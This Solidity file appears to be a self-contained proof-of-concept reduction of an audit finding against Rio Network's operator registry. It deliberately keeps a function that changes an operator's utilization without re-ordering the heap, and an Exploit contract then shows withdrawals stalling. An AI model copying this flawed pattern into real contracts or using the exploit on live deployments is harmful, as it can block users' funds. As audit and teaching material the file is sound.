// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Rio Network — reportOutOfOrderValidatorExits() does not update the heap
    order (Sherlock 2024-02-rio-network-core-protocol, finding #30902, H-7,
    mstpr-brainbot / ComposableSecurity / g)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground. The
    OperatorUtilizationHeap library below is a VERBATIM copy of Rio Network's
    min-max heap (only its LibMap.Uint8Map storage dependency is swapped for a
    minimal equivalent — a pure storage-optimization utility, unrelated to the
    bug). RioLRTOperatorRegistry.reportOutOfOrderValidatorExits() increases an
    operator's `exited` count but NEVER re-orders or re-stores the heap. The
    Exploit deploys a minimal registry with 2 operators, has one fully exit
    "out of order" (without going through the normal deallocation path that
    DOES maintain the heap), and shows deallocateETHDeposits() then picks the
    WRONG (already fully-exited) operator as "most utilized" and halts
    immediately — even though the OTHER operator still has active deposits
    that could satisfy the withdrawal (no fork, no cheatcodes).
//////////////////////////////////////////////////////////////////////////*/

/*//////////////////////////////////////////////////////////////
    Root cause: RioLRTOperatorRegistry.reportOutOfOrderValidatorExits()
    (restaking/RioLRTOperatorRegistry.sol:L310-336, Rio Network) increases
    `operator.validatorDetails.exited` — which changes that operator's
    UTILIZATION (activeDeposits / cap) — but never touches the utilization
    heap (`s.activeOperatorsByETHDepositUtilization`) at all: no
    `updateUtilizationByID`, no `heap.store(...)`.

    `getOperatorUtilizationHeapForETH()` (utils/OperatorRegistryV1Admin.sol:
    L357-386) rebuilds an in-memory heap on every call by walking the STORED
    POSITION ORDER and recomputing each operator's utilization FRESH from
    current storage — but it does NOT re-run the heap's bubble-up/bubble-down
    invariant restoration. The array positions therefore keep reflecting
    whatever ordering was correct THE LAST TIME the heap was properly stored
    (via a path like deallocateETHDeposits, which DOES call heap.store()) —
    not the CURRENT utilization values.

    Once an operator's utilization changes enough to break the heap's
    structural invariant without a re-store, `getMax()`/`getMin()` (which
    trust that invariant rather than re-scanning every element) can return
    the WRONG operator. `deallocateETHDeposits()`
    (restaking/RioLRTOperatorRegistry.sol:L541-560) uses `heap.getMax().id`
    and immediately `break`s the whole withdrawal-servicing loop the moment
    that operator has zero active deposits — even if a DIFFERENT operator
    still has plenty of active deposits that could satisfy the withdrawal.

    Recommended fix (per the report): update the operator's utilization in
    the heap (and re-store it) inside reportOutOfOrderValidatorExits().
//////////////////////////////////////////////////////////////*/

/// @dev Minimal replacement for @solady/utils/LibMap's Uint8Map — a pure
///      storage-packing optimization utility (32 uint8s per slot) that is
///      completely unrelated to this bug. This preserves the exact
///      `.get(i)` / `.set(i, v)` API the heap library uses, just without the
///      bit-packing (irrelevant to correctness of the bug demonstration).
library SimpleUint8Map {
    struct Uint8Map {
        mapping(uint256 => uint8) map;
    }

    function get(Uint8Map storage self, uint256 i) internal view returns (uint8) {
        return self.map[i];
    }

    function set(Uint8Map storage self, uint256 i, uint8 value) internal {
        self.map[i] = value;
    }
}

/// @notice VERBATIM reduction of utils/OperatorUtilizationHeap.sol (Rio
///         Network) — an in-memory min-max heap organizing operators by
///         utilization. Only the LibMap dependency is swapped for
///         SimpleUint8Map above; every function body, comparison, and bubble
///         operation is unchanged. https://people.scs.carleton.ca/~santoro/Reports/MinMaxHeap.pdf
library OperatorUtilizationHeap {
    using OperatorUtilizationHeap for Data;
    using SimpleUint8Map for SimpleUint8Map.Uint8Map;

    error OPERATOR_NOT_FOUND();
    error INVALID_HEAP_SIZE();
    error INVALID_INDEX();
    error HEAP_OVERFLOW();
    error HEAP_UNDERFLOW();

    uint8 constant ROOT_INDEX = 1;

    struct Operator {
        uint8 id;
        uint256 utilization;
    }

    struct Data {
        Operator[] operators;
        uint8 count;
    }

    function initialize(uint8 maxSize) internal pure returns (Data memory) {
        if (maxSize == 0) revert INVALID_HEAP_SIZE();
        return Data(new Operator[](maxSize + 1), 0);
    }

    function isEmpty(Data memory self) internal pure returns (bool) {
        return self.count == 0;
    }

    function isFull(Data memory self) internal pure returns (bool) {
        return self.count == self.operators.length - 1;
    }

    function store(Data memory self, SimpleUint8Map.Uint8Map storage heapStore) internal {
        for (uint8 i = 0; i < self.count;) {
            unchecked {
                heapStore.set(i, self.operators[i + 1].id);
                ++i;
            }
        }
    }

    function insert(Data memory self, Operator memory o) internal pure {
        if (self.isEmpty()) {
            self._push(o);
            return;
        }
        if (self.isFull()) revert HEAP_OVERFLOW();

        self._push(o);
        self._bubbleUp(self.count);
    }

    function remove(Data memory self, uint8 index) internal pure {
        if (index < ROOT_INDEX || index > self.count) revert INVALID_INDEX();

        self._remove(index);
        self._bubbleUp(index);
        self._bubbleDown(index);
    }

    function removeByID(Data memory self, uint8 id) internal pure {
        (uint8 index, bool found) = self._findOperatorIndex(id);
        if (!found) revert OPERATOR_NOT_FOUND();

        self.remove(index);
    }

    function updateUtilization(Data memory self, uint8 index, uint256 newUtilization) internal pure {
        if (index < ROOT_INDEX || index > self.count) revert INVALID_INDEX();

        uint256 oldUtilization = self.operators[index].utilization;
        if (newUtilization == oldUtilization) return;

        self.operators[index].utilization = newUtilization;

        self._bubbleUp(index);
        self._bubbleDown(index);
    }

    function updateUtilizationByID(Data memory self, uint8 id, uint256 newUtilization) internal pure {
        (uint8 index, bool found) = self._findOperatorIndex(id);
        if (!found) revert OPERATOR_NOT_FOUND();

        self.updateUtilization(index, newUtilization);
    }

    function getMin(Data memory self) internal pure returns (Operator memory) {
        if (self.isEmpty()) revert HEAP_UNDERFLOW();

        return self.operators[ROOT_INDEX];
    }

    /// @notice Returns the maximum operator from the heap.
    function getMax(Data memory self) internal pure returns (Operator memory) {
        if (self.isEmpty()) revert HEAP_UNDERFLOW();

        // If the heap only contains one element, it's both the min and max.
        if (self.count == 1) {
            return self.operators[ROOT_INDEX];
        }

        // If the heap has a second level, find the maximum value in that level.
        uint8 maxIndex = 2;
        if (self.count >= 3 && self.operators[3].utilization > self.operators[2].utilization) {
            maxIndex = 3;
        }
        return self.operators[maxIndex];
    }

    function getMaxIndex(Data memory self) internal pure returns (uint8) {
        if (self.isEmpty()) revert HEAP_UNDERFLOW();

        if (self.count == 1) {
            return ROOT_INDEX;
        }

        uint8 maxIndex = 2;
        if (self.count >= 3 && self.operators[3].utilization > self.operators[2].utilization) {
            maxIndex = 3;
        }
        return maxIndex;
    }

    function _bubbleDown(Data memory self, uint8 i) internal pure {
        if (_isOnMinLevel(i)) {
            self._bubbleDownMin(i);
        } else {
            self._bubbleDownMax(i);
        }
    }

    function _bubbleDownMin(Data memory self, uint8 i) internal pure {
        if (self._hasChildren(i)) {
            uint8 m = self._getSmallestChildIndexOrGrandchild(i);
            if (_isGrandchild(i, m)) {
                if (self.operators[m].utilization < self.operators[i].utilization) {
                    self._swap(m, i);
                    uint8 parentOfM = m / 2;
                    if (self.operators[m].utilization > self.operators[parentOfM].utilization) {
                        self._swap(m, parentOfM);
                    }
                    self._bubbleDownMin(m);
                }
            } else {
                if (self.operators[m].utilization < self.operators[i].utilization) {
                    self._swap(m, i);
                }
            }
        }
    }

    function _bubbleDownMax(Data memory self, uint8 i) internal pure {
        if (self._hasChildren(i)) {
            uint8 m = self._getLargestChildIndexOrGrandchild(i);
            if (_isGrandchild(i, m)) {
                if (self.operators[m].utilization > self.operators[i].utilization) {
                    self._swap(m, i);
                    uint8 parentOfM = m / 2;
                    if (self.operators[m].utilization < self.operators[parentOfM].utilization) {
                        self._swap(m, parentOfM);
                    }
                    self._bubbleDownMax(m);
                }
            } else {
                if (self.operators[m].utilization > self.operators[i].utilization) {
                    self._swap(m, i);
                }
            }
        }
    }

    function _bubbleUp(Data memory self, uint8 i) internal pure {
        if (i == ROOT_INDEX) return;

        uint8 parentIndex = i / 2;
        if (_isOnMinLevel(i)) {
            if (_hasParent(i) && self.operators[i].utilization > self.operators[parentIndex].utilization) {
                self._swap(i, parentIndex);
                self._bubbleUpMax(parentIndex);
            } else {
                self._bubbleUpMin(i);
            }
        } else {
            if (_hasParent(i) && self.operators[i].utilization < self.operators[parentIndex].utilization) {
                self._swap(i, parentIndex);
                self._bubbleUpMin(parentIndex);
            } else {
                self._bubbleUpMax(i);
            }
        }
    }

    function _bubbleUpMin(Data memory self, uint8 i) internal pure {
        if (_hasGrandparent(i)) {
            uint8 grandparentIndex = i / 4;
            if (self.operators[i].utilization < self.operators[grandparentIndex].utilization) {
                self._swap(i, grandparentIndex);
                self._bubbleUpMin(grandparentIndex);
            }
        }
    }

    function _bubbleUpMax(Data memory self, uint8 i) internal pure {
        if (_hasGrandparent(i)) {
            uint8 grandparentIndex = i / 4;
            if (self.operators[i].utilization > self.operators[grandparentIndex].utilization) {
                self._swap(i, grandparentIndex);
                self._bubbleUpMax(grandparentIndex);
            }
        }
    }

    function _hasGrandparent(uint8 i) internal pure returns (bool) {
        return i > 3;
    }

    function _hasParent(uint8 i) internal pure returns (bool) {
        return i > ROOT_INDEX;
    }

    function _hasChildren(Data memory self, uint8 i) internal pure returns (bool) {
        return 2 * i <= self.count;
    }

    function _isGrandchild(uint8 i, uint8 m) internal pure returns (bool) {
        return m > 2 * i + 1;
    }

    function _findOperatorIndex(Data memory self, uint8 id) internal pure returns (uint8, bool) {
        for (uint8 i = 1; i <= self.count; ++i) {
            if (self.operators[i].id == id) {
                return (i, true);
            }
        }
        return (0, false);
    }

    function _swap(Data memory self, uint8 index1, uint8 index2) internal pure {
        Operator memory temp = self.operators[index1];
        self.operators[index1] = self.operators[index2];
        self.operators[index2] = temp;
    }

    function _push(Data memory self, Operator memory o) internal pure {
        self.operators[++self.count] = o;
    }

    function _remove(Data memory self, uint8 i) internal pure {
        self.operators[i] = self.operators[self.count--];
    }

    function _getSmallestChildIndexOrGrandchild(Data memory self, uint8 i) internal pure returns (uint8) {
        return self._getExtremeChildIndexOrGrandchild(i, _isSmaller);
    }

    function _getLargestChildIndexOrGrandchild(Data memory self, uint8 i) internal pure returns (uint8) {
        return self._getExtremeChildIndexOrGrandchild(i, _isLarger);
    }

    function _getExtremeChildIndexOrGrandchild(
        Data memory self,
        uint8 i,
        function(uint256, uint256) pure returns (bool) compare
    ) internal pure returns (uint8) {
        uint8 extreme = i;
        uint8 leftChild = 2 * i;
        uint8 rightChild = leftChild + 1;

        if (leftChild <= self.count && compare(self.operators[leftChild].utilization, self.operators[extreme].utilization)) {
            extreme = leftChild;
        }
        if (rightChild <= self.count && compare(self.operators[rightChild].utilization, self.operators[extreme].utilization)) {
            extreme = rightChild;
        }

        uint8 grandChild;
        for (uint8 j = 0; j < 4; j++) {
            grandChild = 2 * leftChild + j;
            if (grandChild <= self.count && compare(self.operators[grandChild].utilization, self.operators[extreme].utilization)) {
                extreme = grandChild;
            }
        }
        return extreme;
    }

    function _isSmaller(uint256 a, uint256 b) private pure returns (bool) {
        return a < b;
    }

    function _isLarger(uint256 a, uint256 b) private pure returns (bool) {
        return a > b;
    }

    function _isOnMinLevel(uint8 index) private pure returns (bool) {
        return _getLevel(index) % 2 == 0;
    }

    function _getLevel(uint8 index) private pure returns (uint8 level) {
        while (index > 1) {
            index >>= 1;
            level += 1;
        }
    }
}

struct OperatorValidatorDetails {
    uint40 cap;
    uint40 deposited;
    uint40 exited;
}

/// @notice Reduced RioLRTOperatorRegistry — only the ETH-deposit utilization
///         heap consumer path matters for this bug. Faithful reduction of
///         restaking/RioLRTOperatorRegistry.sol (Rio Network).
contract OperatorRegistry {
    using OperatorUtilizationHeap for OperatorUtilizationHeap.Data;
    using SimpleUint8Map for SimpleUint8Map.Uint8Map;

    uint8 public activeOperatorCount;
    mapping(uint8 => OperatorValidatorDetails) public validatorDetails;
    SimpleUint8Map.Uint8Map internal activeOperatorsByETHDepositUtilization;

    function addOperator(uint8 operatorId, uint40 cap, uint40 deposited) external {
        validatorDetails[operatorId] = OperatorValidatorDetails({cap: cap, deposited: deposited, exited: 0});
        activeOperatorCount += 1;
    }

    /// @dev Builds and persists the initial heap ordering, exactly as
    ///      `setOperatorValidatorCap`'s insert+store path would.
    function initializeHeap() external {
        OperatorUtilizationHeap.Data memory heap = OperatorUtilizationHeap.initialize(64);
        for (uint8 id = 1; id <= activeOperatorCount; id++) {
            OperatorValidatorDetails memory v = validatorDetails[id];
            uint256 activeDeposits = v.deposited - v.exited;
            heap.insert(OperatorUtilizationHeap.Operator({id: id, utilization: (activeDeposits * 1e18) / uint256(v.cap)}));
        }
        heap.store(activeOperatorsByETHDepositUtilization);
    }

    // ============================================================
    //  getOperatorUtilizationHeapForETH() — faithful reduction of
    //  utils/OperatorRegistryV1Admin.sol:L357-386 (Rio Network)
    // ============================================================
    function getOperatorUtilizationHeapForETH() public view returns (OperatorUtilizationHeap.Data memory heap) {
        uint8 numActiveOperators = activeOperatorCount;
        if (numActiveOperators == 0) return OperatorUtilizationHeap.Data(new OperatorUtilizationHeap.Operator[](0), 0);

        heap = OperatorUtilizationHeap.initialize(64);

        uint256 activeDeposits;
        OperatorValidatorDetails memory v;
        uint8 i;
        for (i = 0; i < numActiveOperators; ++i) {
            uint8 operatorId = activeOperatorsByETHDepositUtilization.get(i);
            if (operatorId == 0) break;

            v = validatorDetails[operatorId];
            activeDeposits = v.deposited - v.exited;
            heap.operators[i + 1] = OperatorUtilizationHeap.Operator({id: operatorId, utilization: (activeDeposits * 1e18) / uint256(v.cap)});
        }
        heap.count = i;
    }

    // ============================================================
    //  Vulnerable reportOutOfOrderValidatorExits() — faithful reduction of
    //  restaking/RioLRTOperatorRegistry.sol:L310-336 (Rio Network)
    //  (fromIndex bounds checks, EigenPod exit verification, and
    //  swapValidatorDetails position-bookkeeping omitted — not relevant to
    //  this bug)
    // ============================================================
    function reportOutOfOrderValidatorExits(uint8 operatorId, uint256, /* fromIndex */ uint256 validatorCount) external {
        // @> VULN: increases `exited` (changing this operator's utilization),
        // but NEVER updates or re-stores activeOperatorsByETHDepositUtilization
        // — the heap keeps ordering operators by their STALE, pre-exit shape.
        // RioLRTOperatorRegistry.sol:L333 (no heap.updateUtilizationByID / store).
        validatorDetails[operatorId].exited += uint40(validatorCount);
    }

    // ============================================================
    //  deallocateETHDeposits() — faithful reduction of
    //  restaking/RioLRTOperatorRegistry.sol:L541-560 (Rio Network)
    // ============================================================
    function deallocateETHDeposits(uint256 depositsToDeallocate) external returns (uint256 depositsDeallocated) {
        OperatorUtilizationHeap.Data memory heap = getOperatorUtilizationHeapForETH();

        uint256 remainingDeposits = depositsToDeallocate;
        while (remainingDeposits > 0) {
            uint8 operatorId = heap.getMax().id;

            OperatorValidatorDetails memory v = validatorDetails[operatorId];
            uint256 activeDeposits = v.deposited - v.exited;

            // Exit early if the operator with the highest utilization rate has no active deposits,
            // as no further deallocations can be made.
            if (activeDeposits == 0) break;

            uint256 newDealloc = activeDeposits < remainingDeposits ? activeDeposits : remainingDeposits;
            validatorDetails[operatorId].exited += uint40(newDealloc);
            remainingDeposits -= newDealloc;

            uint256 updatedAllocation = activeDeposits - newDealloc;
            heap.updateUtilization(heap.getMaxIndex(), (updatedAllocation * 1e18) / uint256(v.cap));
        }
        depositsDeallocated = depositsToDeallocate - remainingDeposits;

        heap.store(activeOperatorsByETHDepositUtilization);
    }
}

/// @notice Orchestrator. Deploys a minimal 2-operator registry, builds the
///         initial (correctly-ordered) heap, has operator #2 (the current
///         max-utilization operator) fully exit "out of order", and shows
///         deallocateETHDeposits() then picks operator #2 (0% utilization,
///         fully exited) as if it were still "most utilized" and halts
///         immediately — even though operator #1 still has active deposits
///         that could satisfy the withdrawal. Cheatcode-free.
contract Exploit {
    using OperatorUtilizationHeap for OperatorUtilizationHeap.Data;

    OperatorRegistry public registry; // CREATE nonce 1

    constructor() {
        registry = new OperatorRegistry(); // nonce 1

        // Operator 1: cap 100, deposited 5  -> utilization 5%  (becomes heap MIN)
        // Operator 2: cap 100, deposited 15 -> utilization 15% (becomes heap MAX)
        registry.addOperator(1, 100, 5);
        registry.addOperator(2, 100, 15);
        registry.initializeHeap();
    }

    function run() external {
        // Baseline: operator 2 (15% utilization) is correctly the heap's max.
        OperatorUtilizationHeap.Data memory baselineHeap = registry.getOperatorUtilizationHeapForETH();
        require(baselineHeap.getMax().id == 2, "baseline max should be operator 2");
        require(baselineHeap.getMin().id == 1, "baseline min should be operator 1");

        // === Operator 2 fully exits ALL 15 validators "out of order" (e.g. a
        //     voluntary/slashing exit on the beacon chain, reported after the
        //     fact) — its utilization drops from 15% to 0%. ===
        registry.reportOutOfOrderValidatorExits(2, 0, 15);

        // HARM setup: operator 2's utilization is now 0% — the LOWEST of the
        // two — yet the heap was never re-ordered to reflect this.
        OperatorUtilizationHeap.Data memory staleHeap = registry.getOperatorUtilizationHeapForETH();
        require(staleHeap.getMax().id == 2, "VULN: heap still reports the fully-exited operator 2 as max");

        // === HARM: a user's withdrawal needs to deallocate 3 deposits.
        //     Operator 1 has 5 active deposits — MORE than enough. But
        //     deallocateETHDeposits() consults the stale heap, picks operator
        //     2 (0 active deposits) first, and halts immediately. ===
        uint256 deallocated = registry.deallocateETHDeposits(3);
        require(deallocated == 0, "harm not demonstrated: deallocation should be fully blocked");

        (,, uint40 op1Exited) = registry.validatorDetails(1);
        require(op1Exited == 0, "operator 1's active deposits were never touched, despite being available");
    }
}
